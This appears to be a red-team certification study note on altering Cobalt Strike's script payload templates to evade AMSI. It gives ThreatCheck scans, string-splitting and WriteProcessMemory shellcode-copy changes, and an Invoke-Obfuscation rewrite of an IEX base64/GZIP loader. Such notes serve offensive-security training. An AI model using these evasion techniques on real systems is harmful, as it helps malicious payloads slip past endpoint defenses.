---
domain: defense-evasion-opsec
tags: [resource-kit, av-evasion, AMSI, powershell, ThreatCheck, obfuscation, cobalt-strike]
tools: [Cobalt-Strike, ThreatCheck, Invoke-Obfuscation]
opsec: high
exam-relevance: core
---

# Resource Kit

## What It Is

The script-based equivalent of the [[Artifact-Kit]]. Provides source files for Cobalt Strike's script payload templates (.ps1, .vbs, .hta, etc.). AMSI is the primary concern for script-based payloads.

## Full Workflow

> 1. **Build** — `build.sh` outputs script templates containing **no shellcode** (placeholders only)
> 2. **Test** — even without shellcode, AMSI can detect the template script code itself (e.g. function names, API call patterns)
> 3. **Clean** — use ThreatCheck (`-e AMSI -t Script`) to find and modify signatured portions until templates pass
> 4. **Load** — load `resources.cna` via Script Manager; CS now uses your modified templates when generating script payloads
> 5. **Generate** — new payloads produced from this point use the cleaned templates with shellcode patched in

## Build

```bash
./build.sh <output_dir>
```

Output files:

| File | Purpose |
|------|---------|
| `template.x64.ps1` / `template.x86.ps1` | Stageless PS payloads (e.g. used by `jump winrm64`) |
| `template.hint.x64.ps1` / `.x86.ps1` | Hint-based stageless PS templates |
| `compress.ps1` | GZIP+base64 wrapper for scripted web delivery |
| `template.exe.hta` / `template.psh.hta` | HTA payload templates |
| `template.vbs` / `template.x86.vba` | VBScript / VBA templates |
| `template.py` | Python template |
| `resources.cna` | Aggressor script to load into CS |

---

## Testing: ThreatCheck (AMSI mode)

Script files must be scanned against the AMSI engine, not Defender's file engine:

```powershell
ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

---

## Fixing template.x64.ps1 — Example Workflow

### Iteration 1: String Concatenation

ThreatCheck flags near the start of the file. The offending line contains:

```powershell
('System.dll')
```

Fix — break the string:

```powershell
('Syst'+'em.dll')
```

Rescan. A new detection appears further into the file.

### Iteration 2: API Swap

The next detection targets `[System.Runtime.InteropServices.Marshal]::Copy()` being used to copy shellcode into memory. Replace with a direct call to `WriteProcessMemory` via P/Invoke:

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

Rescan → `[+] No threat found!`

---

## compress.ps1 — Layered AMSI Evaluation

`compress.ps1` wraps `template.[x64/x86].ps1` in GZIP + base64:

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

ThreatCheck shows it clean in isolation, but **AMSI evaluates PowerShell in layers** — it scans output after each expression is evaluated (e.g. after `FromBase64String` decodes the payload). ThreatCheck cannot replicate this layered evaluation.

### Fix: Invoke-Obfuscation

For layered AMSI detections, use obfuscation rather than code changes. Do **not** modify the `%%DATA%%` placeholder — CS patches shellcode into this location.

```powershell
ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
Invoke-Obfuscation

Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(...);IEX ...'
# Apply token obfuscation — example result:
```

```powershell
SET-itEm VarIABLe:WyizE ([tyPe]('conVE'+'Rt'));seT-variAbLe 0eXs ([tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE'));
${s}=nEW-oBjeCt IO.`MemOryStREAM(,(VAriABle wYIze -val)::"FRomBAsE64sTriNG"("%%DATA%%"));
iEX (new-oBJECT io.sTrEAmREADEr(NEw-OBJeCT IO.COmPrESSioN.gzIpSTream(${s},(vAriable 0ExS).vALUE::"DecomPress")))."REAdTOEnd"();
```

Overwrite `compress.ps1` with the obfuscated version. Test by hosting a scripted web delivery payload and executing it on a target.

---

## Loading into Cobalt Strike

**CS client → Cobalt Strike > Script Manager → Load → select `resources.cna`**

Test new payloads on your own machine before deploying on a target.

## Related Notes

- [[AMSI-Bypass]]
- [[Artifact-Kit]]
- [[Defense-Evasion-Overview]]
- [[02-Domains/C2-Infrastructure-Cobalt-Strike/Beacon-Payloads]]
